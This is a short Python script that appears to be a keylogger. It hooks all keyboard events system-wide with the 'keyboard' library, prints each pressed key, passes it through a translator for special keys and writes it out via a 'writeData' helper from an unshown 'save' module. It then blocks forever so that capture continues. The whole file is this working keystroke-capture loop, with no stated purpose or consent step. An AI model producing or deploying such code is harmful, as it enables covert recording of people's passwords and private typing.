from translators import *
from save import *

import keyboard


def print_pressed_keys(e):
    # print(e)
    if e.event_type == "down":
        print(e.name)
        writeData(specal_buttons(e.name))
    # print(e.event_type)


keyboard.hook(print_pressed_keys)
keyboard.wait()
